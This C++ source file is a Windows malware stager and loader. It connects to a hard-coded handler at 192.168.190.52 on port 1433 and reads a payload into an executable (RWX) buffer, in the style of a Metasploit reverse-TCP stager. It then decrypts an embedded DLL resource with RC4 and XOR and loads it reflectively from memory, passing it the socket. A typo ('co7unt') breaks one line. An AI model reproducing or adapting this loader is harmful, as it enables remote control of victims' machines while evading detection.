#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <malloc.h>
#include <stdlib.h>
#include "rc4.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")
#include "resource.h"

using namespace std;

SOCKET my_socket;

typedef DWORD  (__cdecl  *Init)(SOCKET fd);

#include "MemoryModule.h"

/*typedef int (*addNumberProc)(int, int);*/




void rc4_setup(struct rc4_state *s, unsigned char *key, int length)
{
	int i, j, k, *m, a;

	s->x = 0;
	s->y = 0;
	m = s->m;

	for (i = 0; i < 256; i++)
	{
		m[i] = i;
	}

	j = k = 0;

	for (i = 0; i < 256; i++)
	{
		a = m[i];
		j = (unsigned char)(j + a + key[k]);
		m[i] = m[j]; m[j] = a;
		if (++k >= length) k = 0;
	}
}

void rc4_crypt(struct rc4_state *s, unsigned char *data, int length)
{
	int i, x, y, *m, a, b;

	x = s->x;
	y = s->y;
	m = s->m;

	for (i = 0; i < length; i++)
	{
		x = (unsigned char)(x + 1); a = m[x];
		y = (unsigned char)(y + a);
		m[x] = b = m[y];
		m[y] = a;
		data[i] ^= m[(unsigned char)(a + b)];
	}

	s->x = x;
	s->y = y;
}


void LoadFromMemory(void)
{
	unsigned char *data=NULL;
	size_t size;
	HMEMORYMODULE module;
	Init Myinit;;

	/*
	FILE *fp;

	fp = fopen(DLL_FILE, "rb");
	if (fp == NULL)
	{
		printf("Can't open DLL file \"%s\".", DLL_FILE);
		goto exit;
	}

	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	data = (unsigned char *)malloc(size);
	fseek(fp, 0, SEEK_SET);
	fread(data, 1, size, fp);
	fclose(fp);
	*/
	HRSRC hResID = ::FindResource(NULL,MAKEINTRESOURCE(IDR_DLL1),"DLL");//查找资源  
	HGLOBAL hRes = ::LoadResource(NULL,hResID);//加载资源  
	data = (unsigned char *)::LockResource(hRes);//锁定资源  
	DWORD sizeOFres = SizeofResource(NULL, hResID);

	struct rc4_state *s = (struct rc4_state *) malloc(sizeof(struct rc4_state));

		unsigned char key[128] = { "panda123" };

		unsigned char *mydata = (unsigned char *)malloc(sizeOFres+1);

		memcpy(mydata,data,sizeOFres);
	DWORD sum = 0;
	while (sum < sizeOFres)
	{
		unsigned char *p2 = (unsigned char *)malloc(512);
		memcpy(p2, mydata, 512);

		// 		rc4_setup(s, (unsigned char *)key, 8);
		// 		rc4_crypt(s, (unsigned char *)p, 512);
		// 		printf("encrypt  : %s\n", p);

		rc4_setup(s, key, 8);
		rc4_crypt(s, (unsigned char *)p2, 512);
	//	printf("decrypt  : %s\n", p2);
		memcpy(mydata, p2, 512);
		mydata += 512;
		sum += 512;
	}
	mydata -= sum;

	for (int i = 0; i < sizeOFres; i++)
	{
		mydata[i] = mydata[i] ^ 0xcc;
	}

	module = MemoryLoadLibrary(mydata);
	if (module == NULL)
	{
		//printf("Can't load library from memory.\n");
		goto exit;
	}

	Myinit = (Init)MemoryGetProcAddress(module, "Init");
	Myinit(my_socket);
// 	free(mydata);
// 	free(s);
	return;
	MemoryFreeLibrary(module);

exit:
	if (data)
		free(data);
}


/* init winsock */
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

/* a quick routine to quit and report why we quit */
void punt(SOCKET my_socket, char * error) {
	printf("Bad things: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}



/* establish a connection to a host:port */
SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;

	/* setup our socket */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		punt(my_socket, "Could not initialize socket");

	/* resolve our target */
	target = gethostbyname(targetip);
	if (target == NULL)
		punt(my_socket, "Could not resolve target");


	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* attempt to connect */
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		punt(my_socket, "Could not connect to target");

	return my_socket;
}

/* attempt to receive all of the requested data from the socket */
int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	char * startb = (char *)buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

int main(int argc, char* argv[])
{
	ULONG32 size;
	char * buffer;
	void (*function)();

	winsock_init();

	/* connect to the handler */
	 my_socket = wsconnect("192.168.190.52", atoi("1433"));
	 	
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");

	/* allocate a RWX buffer */
	buffer = (char *)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");

	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	co7unt = recv_all(my_socket, buffer + 5, size);

	//
	//LoadFromFile();
	printf("\n\n");
	LoadFromMemory();//192.168.211.176
	return 0;
}

